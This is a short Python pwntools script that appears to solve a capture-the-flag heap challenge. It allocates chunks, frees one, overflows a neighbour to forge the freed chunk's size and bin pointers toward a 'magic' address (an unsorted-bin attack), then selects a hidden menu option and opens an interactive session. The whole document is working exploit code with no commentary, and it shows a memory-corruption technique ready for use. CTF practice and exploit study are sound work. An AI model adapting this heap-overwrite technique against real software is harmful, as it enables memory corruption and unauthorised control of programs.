magic_addr = 0x6020c0
arr_addr = 0x6020E0


def alloc(size, content):
	print(p.recv())
	p.sendline('1')
	print(p.recv())
	p.sendline(size)
	print(p.recv())
	p.sendline(content)

def edit(index, size, content):
	print(p.recv())
	p.sendline('2')
	print(p.recv())
	p.sendline(index)
	print(p.recv())
	p.sendline(size)
	print(p.recv())
	p.sendline(content)

def delete(index):
	print(p.recv())
	p.sendline('3')
	print(p.recv())
	p.sendline(index)

alloc('128', 'a'*128)
alloc('128', 'b'*128)
alloc('128', 'c'*128)
delete('1')
edit('0', '160', 'z'*128 + p64(0x0) + p64(0x91) + p64(magic_addr) + p64(magic_addr - 0x10))
alloc('128', 'a'*8)
print(p.recv())
p.sendline('4869')
print(p.recv())
print(p.recv())
p.interactive()
